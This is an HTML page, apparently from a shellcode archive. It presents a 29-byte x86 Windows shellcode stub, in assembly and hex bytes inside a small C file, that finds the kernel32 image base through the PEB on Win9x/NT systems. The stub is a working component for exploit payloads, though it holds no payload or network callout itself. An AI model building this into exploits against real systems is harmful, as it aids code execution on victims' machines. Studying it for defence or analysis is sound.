<html><head><title>Windows - PEB method (9x/NT/2k/XP) - 29 bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
//
// PEB way of getting kernel32 imagebase by loco.
// Compatible with all Win9x/NT based operating systems.
//
// Gives kernel32 imagebase in eax when executing.
// 29 bytes, only eax/esi used.
//
// Originally discovered by Dino Dai Zovi.
//
//

#include &lt;stdio.h&gt;

/*
	xor   eax, eax
	add   eax, fs:[eax+30h]
	js    method_9x

method_nt:
	mov   eax, [eax + 0ch]
	mov   esi, [eax + 1ch]
	lodsd
	mov   eax, [eax + 08h]
	jmp   kernel32_ptr_found

method_9x:
	mov   eax, [eax + 34h]
	lea   eax, [eax + 7ch]
	mov   eax, [eax + 3ch]
kernel32_ptr_found:
*/

unsigned char Shellcode[] =
	&quot;\x33\xC0&quot;          // xor eax, eax
	&quot;\x64\x03\x40\x30&quot;  // add eax, dword ptr fs:[eax+30]
	&quot;\x78\x0C&quot;          // js short $+12
	&quot;\x8B\x40\x0C&quot;      // mov eax, dword ptr [eax+0C]
	&quot;\x8B\x70\x1C&quot;      // mov esi, dword ptr [eax+1C]
	&quot;\xAD&quot;              // lodsd
	&quot;\x8B\x40\x08&quot;      // mov eax, dword ptr [eax+08]
	&quot;\xEB\x09&quot;          // jmp short $+9
	&quot;\x8B\x40\x34&quot;      // mov eax, dword ptr [eax+34]
	&quot;\x8D\x40\x7C&quot;      // lea eax, dword ptr [eax+7C]
	&quot;\x8B\x40\x3C&quot;      // mov eax, dword ptr [eax+3C]
; // = 29 bytes.

int main()
{
	printf(&quot;Shellcode is %u bytes.\n\n&quot;, sizeof(Shellcode)-1);
	return 1;
}


<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
